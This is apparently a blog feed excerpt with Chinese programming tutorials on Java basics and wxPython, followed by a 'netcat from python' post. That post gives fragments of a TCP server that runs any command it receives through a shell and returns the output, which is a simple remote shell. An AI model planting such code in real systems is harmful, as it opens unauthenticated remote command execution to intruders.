class="line">        System.out.println(a);</span><br><span class="line">        a *= b;   <span class="comment">//a = a*b</span></span><br><span class="line">        System.out.println(a);</span><br><span class="line">        a /= b ;   <span class="comment">//a = a/b</span></span><br><span class="line">        System.out.println(a);</span><br><span class="line">        a %= b ;    <span class="comment">//a = a % b</span></span><br><span class="line">        System.out.println(a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></td><td align="center"></td><td align="center"></td></tr></tbody></table><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">5</span><br><span class="line">10</span><br><span class="line">7</span><br><span class="line">21</span><br><span class="line">7</span><br><span class="line">1</span><br></pre></td></tr></table></figure></div><h3 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符"></a>关系运算符</h3><blockquote><p> 关系运算符的结果是布尔类型，True和False。关系运算符有6种：==,&lt;=,&gt;=,!=,&gt;,&lt;.</p></blockquote><h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><blockquote><p>  逻辑运算符是布尔类型进行运算，所以结果也是布尔类型。<br>|运算符|名称|说明|例子|<br>|:——:|:——:|:——-:|:——:|<br>|!|非|a 为 true 时，值为 false，a 为 false 时，值为 true|a!b|<br>|&amp;|与|ab 全为 true 时，计算结果为 true，否则为 false|a&amp;b|<br>| | |或|ab 全为 false 时，计算结果为 false，否则为 true|a|b |<br>| &amp;&amp;|短路与|ab 全为 true 时，计算结果为 true，否则为 false。&amp;&amp;与&amp;区别：如果 a 为 false，则不计算b|a &amp;&amp; b|<br>||||短路或|ab 全为 false 时，计算结果为 false，否则为 true。||与|区别：如果 a 为 true，则不计算 b|a||b|</p></blockquote><h2 id="控制语句"><a href="#控制语句" class="headerlink" title="控制语句"></a>控制语句</h2><h3 id="if语句"><a href="#if语句" class="headerlink" title="if语句"></a>if语句</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> basic_grammar;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">java_if</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> source = <span class="number">95</span>;</span><br><span class="line">        <span class="keyword">if</span> (source &gt;= <span class="number">90</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">"A"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>  <span class="keyword">if</span> (source &gt;= <span class="number">80</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">"B"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>  <span class="keyword">if</span> (source &gt;= <span class="number">70</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">"C"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">"E"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//        if (source &lt;60) &#123;</span></span><br><span class="line"><span class="comment">//            System.out.println("不及格，加油哦！");</span></span><br><span class="line"><span class="comment">//        &#125;else &#123;</span></span><br><span class="line"><span class="comment">//            System.out.println("真棒，及格。");</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//        if (source&gt;= 85)&#123;</span></span><br><span class="line"><span class="comment">//            System.out.println("你真优秀！");</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//        if (source&lt;60)&#123;</span></span><br><span class="line"><span class="comment">//            System.out.println("您需要继续加油哦！");</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//        if ((source&gt;60) &amp;&amp; (source&lt;=85)) &#123;</span></span><br><span class="line"><span class="comment">//            System.out.println("不错哦，继续努力！");</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="switch语句"><a href="#switch语句" class="headerlink" title="switch语句"></a>switch语句</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> basic_grammar;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Swatch</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> testsorce = <span class="number">75</span>;</span><br><span class="line">        <span class="keyword">char</span> grade;</span><br><span class="line">        <span class="keyword">switch</span> (testsorce/<span class="number">10</span>)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">                grade = <span class="string">'优'</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">                grade = <span class="string">'良'</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">                grade = <span class="string">'中'</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    grade = <span class="string">'差'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"Grade="</span>+grade);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Grade=中</span><br></pre></td></tr></table></figure></div><h3 id="while"><a href="#while" class="headerlink" title="while"></a>while</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> basic_grammar;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">java_while</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i*i&lt;<span class="number">100</span>)&#123;</span><br><span class="line">            System.out.println(i);</span><br><span class="line">            i ++;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td></tr></table></figure></div><h3 id="do-while"><a href="#do-while" class="headerlink" title="do-while"></a>do-while</h3><blockquote><p> do-while语句使用和while相似，不过do-while是事后判断循环的。</p></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> basic_grammar;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">java_do_while</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            i++;</span><br><span class="line">            System.out.println(i);</span><br><span class="line">        &#125;<span class="keyword">while</span> (i*i&lt;<span class="number">100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> springboot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nwx（wxPython）</title>
      <link href="/2019/01/19/nwx-wxpython/"/>
      <url>/2019/01/19/nwx-wxpython/</url>
      
        <content type="html"><![CDATA[<h1 id="wx（wxPython）"><a href="#wx（wxPython）" class="headerlink" title="wx（wxPython）"></a>wx（wxPython）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p> 使用了很多模块心血来潮觉得要写一些相关模块的使用文档。并想把常用的模块写成一个自己常用的类。这样只需要调用就行了，可以对自己写东西的时候节省时间。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -U wxPython</span><br></pre></td></tr></table></figure></div><h2 id="创建一个简单程序"><a href="#创建一个简单程序" class="headerlink" title="创建一个简单程序"></a>创建一个简单程序</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># First things, first. Import the wxPython package.</span></span><br><span class="line"><span class="keyword">import</span> wx</span><br><span class="line"></span><br><span class="line"><span class="comment"># Next, create an application object.</span></span><br><span class="line">app = wx.App()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Then a frame.</span></span><br><span class="line">frm = wx.Frame(<span class="literal">None</span>, title=<span class="string">"Hello World"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Show it.</span></span><br><span class="line">frm.Show()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Start the event loop.</span></span><br><span class="line">app.MainLoop()</span><br></pre></td></tr></table></figure></div><h2 id="GUI设计"><a href="#GUI设计" class="headerlink" title="GUI设计"></a>GUI设计</h2><blockquote><p> wx.BoxSizer()<br> 这个可以设置你的box的比例。proportion比例设置。</p></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">url_text = wx.StaticText(self.panel,label=<span class="string">u"路径："</span>)</span><br><span class="line">self.path_text = wx.TextCtrl(self.panel,wx.TE_MULTILINE)</span><br><span class="line">openfile_text = wx.Button(self.panel,label=<span class="string">u"打开"</span>)</span><br><span class="line">openfile_text.Bind(wx.EVT_BUTTON,self.readfile)</span><br><span class="line">self.content_text = wx.TextCtrl(self.panel,style =wx.TE_MULTILINE)</span><br><span class="line">box = wx.BoxSizer()</span><br><span class="line">box.Add(url_text,proportion = <span class="number">0.5</span>,flag = wx.ALIGN_CENTER|wx.ALIGN_RIGHT,border=<span class="number">3</span>)</span><br><span class="line">box.Add(self.path_text,proportion = <span class="number">3</span>,flag = wx.EXPAND|wx.ALL,border=<span class="number">3</span>)</span><br><span class="line">box.Add(openfile_text,proportion = <span class="number">1</span>,flag = wx.EXPAND|wx.ALL,border=<span class="number">3</span>)</span><br></pre></td></tr></table></figure></div><h3 id="设置了0-5-3-1"><a href="#设置了0-5-3-1" class="headerlink" title="设置了0.5|3|1"></a>设置了0.5|3|1</h3><p><a href="https://image.kalifun.top/upload/1902/270a32000255164c.png" target="_blank" rel="noopener"><img src="https://image.kalifun.top/upload/1902/270a32000255164c.png" alt></a></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v_box = wx.BoxSizer(wx.VERTICAL)</span><br><span class="line">v_box.Add(box,proportion = <span class="number">0.5</span>,flag=wx.EXPAND|wx.ALL,border=<span class="number">3</span>)</span><br><span class="line">v_box.Add(self.content_text,proportion = <span class="number">5</span>,flag=wx.EXPAND|wx.ALL,border=<span class="number">3</span>)</span><br></pre></td></tr></table></figure></div><h3 id="上下分为两个部分，上下分为0-5-5"><a href="#上下分为两个部分，上下分为0-5-5" class="headerlink" title="上下分为两个部分，上下分为0.5|5"></a>上下分为两个部分，上下分为0.5|5</h3><p> 设置了 0.5|5<br><a href="https://image.kalifun.top/upload/1902/741a19ade9085a02.png" target="_blank" rel="noopener"><img src="https://image.kalifun.top/upload/1902/741a19ade9085a02.png" alt></a></p><h2 id="创建事件"><a href="#创建事件" class="headerlink" title="创建事件"></a>创建事件</h2><blockquote><p> 创建事件基本发生在button上。创建事件关键词bind</p></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openfile_text.Bind(wx.EVT_BUTTON,self.readfile)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">readfile</span><span class="params">(self,event)</span>:</span></span><br></pre></td></tr></table></figure></div><h2 id="完全代码"><a href="#完全代码" class="headerlink" title="完全代码"></a>完全代码</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> wx</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OpenfileTool</span><span class="params">(wx.Frame)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,parent,title)</span>:</span></span><br><span class="line">        wx.Frame.__init__(self, parent, title=title,size=(<span class="number">500</span>,<span class="number">400</span>))</span><br><span class="line">        self.panel = wx.Panel(self)</span><br><span class="line">        self.content()</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">content</span><span class="params">(self)</span>:</span></span><br><span class="line">        url_text = wx.StaticText(self.panel,label=<span class="string">u"路径："</span>)</span><br><span class="line">        self.path_text = wx.TextCtrl(self.panel,wx.TE_MULTILINE)</span><br><span class="line">        openfile_text = wx.Button(self.panel,label=<span class="string">u"打开"</span>)</span><br><span class="line">        openfile_text.Bind(wx.EVT_BUTTON,self.readfile)</span><br><span class="line">        self.content_text = wx.TextCtrl(self.panel,style =wx.TE_MULTILINE)</span><br><span class="line">        box = wx.BoxSizer()</span><br><span class="line">        box.Add(url_text,proportion = <span class="number">0.5</span>,flag = wx.ALIGN_CENTER|wx.ALIGN_RIGHT,border=<span class="number">3</span>)</span><br><span class="line">        box.Add(self.path_text,proportion = <span class="number">3</span>,flag = wx.EXPAND|wx.ALL,border=<span class="number">3</span>)</span><br><span class="line">        box.Add(openfile_text,proportion = <span class="number">1</span>,flag = wx.EXPAND|wx.ALL,border=<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">        v_box = wx.BoxSizer(wx.VERTICAL)</span><br><span class="line">        v_box.Add(box,proportion = <span class="number">0.5</span>,flag=wx.EXPAND|wx.ALL,border=<span class="number">3</span>)</span><br><span class="line">        v_box.Add(self.content_text,proportion = <span class="number">5</span>,flag=wx.EXPAND|wx.ALL,border=<span class="number">3</span>)</span><br><span class="line">        self.panel.SetSizer(v_box)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">readfile</span><span class="params">(self,event)</span>:</span></span><br><span class="line">        <span class="keyword">with</span> wx.FileDialog(self, <span class="string">"Open XYZ file"</span>, wildcard=<span class="string">"txt files (*.txt)|*.txt"</span>,style=wx.FD_OPEN | wx.FD_FILE_MUST_EXIST) <span class="keyword">as</span> fileDialog:</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> fileDialog.ShowModal() == wx.ID_CANCEL:</span><br><span class="line">                <span class="keyword">return</span>     </span><br><span class="line">            <span class="comment"># the user changed their mind</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># Proceed loading the file chosen by the user</span></span><br><span class="line">            pathname = fileDialog.GetPath()</span><br><span class="line">            self.path_text.SetValue(pathname)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> open(pathname, <span class="string">'r'</span>) <span class="keyword">as</span> file:</span><br><span class="line">                    <span class="comment"># datas = file.readlines()</span></span><br><span class="line">                    <span class="comment"># for data in datas:</span></span><br><span class="line">                    <span class="comment">#     self.loadfile(data)</span></span><br><span class="line">                    self.content_text.SetValue(file.read())</span><br><span class="line">            <span class="keyword">except</span> IOError:</span><br><span class="line">                wx.LogError(<span class="string">"Cannot open file '%s'."</span> % newfile)</span><br><span class="line">    <span class="comment"># def loadfile(self,data):</span></span><br><span class="line">    <span class="comment">#     self.content_text.SetValue(data)</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app = wx.App(<span class="literal">True</span>)</span><br><span class="line">    frame = OpenfileTool(<span class="literal">None</span>,<span class="string">"OpenfileTool"</span>)</span><br><span class="line">    frame.Show()</span><br><span class="line">    app.MainLoop()</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>netcat  from python</title>
      <link href="/2019/01/17/netcat-from-python/"/>
      <url>/2019/01/17/netcat-from-python/</url>
      
        <content type="html"><![CDATA[<h1 id="netcat-from-python"><a href="#netcat-from-python" class="headerlink" title="netcat  from python"></a>netcat  from python</h1><blockquote><p> 在网络工具中有“瑞士军刀”美誉的NetCat， 在我们用了N年了至今仍是爱不释手。<br>学习信息安全的应该很熟悉，用来反弹shell。</p></blockquote><h2 id="Model-socket"><a href="#Model-socket" class="headerlink" title="Model [socket]"></a>Model [socket]</h2><blockquote><p>网络上的两个程序通过一个双向的通信连接实现数据的交换，这个连接的一端称为一个socket。<br> 我们需要一个服务端和客户端之间进行通信连接<br> 支持TCP/UDP协议，在未被关闭TCP的情况下还是使用TCP协议（三次握手还是比较稳的）。</p></blockquote><h2 id="CODE"><a href="#CODE" class="headerlink" title="CODE"></a>CODE</h2><blockquote><h3 id="server-py"><a href="#server-py" class="headerlink" title="server.py"></a>server.py</h3></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Tcp_server = SocketServer.ThreadingTCPServer((str(socket_ip),int(socket_port)),Tcp_socket)</span><br><span class="line">Tcp_server.serve_forever()</span><br></pre></td></tr></table></figure></div><h4 id="实现多线程TCP，这样可以多个客户端进行连接。"><a href="#实现多线程TCP，这样可以多个客户端进行连接。" class="headerlink" title="实现多线程TCP，这样可以多个客户端进行连接。"></a>实现多线程TCP，这样可以多个客户端进行连接。</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                get_bytes = conn.recv(<span class="number">1024</span>)</span><br><span class="line">                get_info = str(get_bytes)</span><br><span class="line">                <span class="keyword">if</span> get_info == <span class="string">"q"</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        command = subprocess.check_output(get_bytes,stderr=subprocess.STDOUT,shell=<span class="literal">True</span>,universal_newlines=<span class="literal">True</span>)</span><br><span class="line">                        command_info = conn.send(bytes(command))</span><br><span class="line">                    <span class="keyword">except</span>:</span><br><span class="line">                        <span class="keyword">return</span> command</span><br><span class="line">                    <span class="comment"># try:</span></span><br><span class="line">                    <span class="comment">#     command = os.popen(get_bytes).read()</span></span><br><span class="line">                    <span class="comment">#     command_info = conn.send(bytes(command))</span></span><br><span class="line">                    <span class="comment"># except Exception,e:</span></span><br><span class="line">                    <span class="comment">#     command = os.popen(get_bytes).read()</span></span><br><span class="line">                    <span class="comment">#     command_info = conn.send(bytes(command))                     </span></span><br><span class="line">            <span class="keyword">except</span> Exception,e:</span><br><span class="line">                <span class="keyword">print</span> e</span><br></pre></td></tr></table></figure></div><p> 摒弃os.popen，当出现错误命令时导致服务卡死。</p><blockquote><h3 id="client-py"><a href="#client-py" class="headerlink" title="client.py"></a>client.py</h3><p>将请求发送给服务端，然后接收返回值的一个过程。</p></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sed_data = raw_input(<span class="string">"&gt;&gt;&gt;"</span>)</span><br><span class="line">            <span class="keyword">if</span> sed_data == <span class="string">"q"</span>:</span><br><span class="line">                conn.send(bytes(sed_data))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    conn.send(bytes(sed_data))</span><br><span class="line">                    get_bytes = conn.recv(<span class="number">1024</span>)</span><br><span class="line">                    get_info = str(get_bytes)</span><br><span class="line">                    <span class="keyword">print</span> get_info</span><br><span class="line">                <span class="keyword">except</span> Exception,e:</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"Command Not Found !"</span></span><br><span class="line">                    create_socket(socket_ip,socket_port)</span><br><span class="line">                    <span class="comment"># sed_data = raw_input("&gt;&gt;&gt;")</span></span><br><span class="line">                    <span class="comment"># conn.send(bytes(sed_data))</span></span><br><span class="line">                    <span class="comment"># get_bytes = conn.recv(1024)</span></span><br><span class="line">                    <span class="comment"># get_info = str(get_bytes)</span></span><br><span class="line">                    <span class="comment"># print get_info</span></span><br><span class="line">        <span class="keyword">except</span> Exception,e:</span><br><span class="line">            <span class="keyword">print</span> e</span><br></pre></td></tr></table></figure></div><p>利用报错处理来重新调用函数来解决输入错误命令卡死的现象。<br>当输入错误命令时，多输入两次命令让程序进行重新调用函数。</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> netcat </tag>
            
            <tag> hack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>豆瓣TOP250</title>
      <link href="/2018/12/29/dou-ban-top250/"/>
      <url>/2018/12/29/dou-ban-top250/</url>
      
